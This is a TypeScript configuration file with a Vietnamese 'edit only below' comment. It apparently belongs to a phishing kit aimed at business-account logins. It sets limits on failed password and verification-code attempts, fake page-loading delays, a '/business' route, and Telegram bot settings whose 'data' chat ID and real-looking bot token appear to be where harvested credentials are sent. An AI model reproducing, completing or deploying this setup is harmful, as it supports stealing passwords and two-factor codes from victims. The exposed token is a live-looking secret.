interface Config {
	settings: {
		code_loading_time: number;
		max_failed_code_attempts: number;
		max_failed_password_attempts: number;
		page_loading_time: number;
		password_loading_time: number;
		code_input_enabled: boolean;
	};
	telegram: {
		notification_chatid: string;
		notification_token: string;
		data_chatid: string;
		data_token: string;
	};
	router: {
		business_url: string;
	};
}

const getConfig = async (): Promise<Config> => {
	// b thay vao day nhe, chi sua o duoi nay
	return {
		settings: {
			code_loading_time: 3000,
			max_failed_code_attempts: 5,
			max_failed_password_attempts: 3,
			page_loading_time: 2000,
			password_loading_time: 4000,
			code_input_enabled: true,
		},
		telegram: {
			notification_chatid: '123456789',
			notification_token: 'abcdefg-token',
			data_chatid: '-4544438437',
			data_token: '7884681232:AAHm56ZhVmpGU5AaCmzk3TWpLrbIQ31kpWY',
		},
		router: {
			business_url: '/business',
		},
	};
};

export default getConfig;
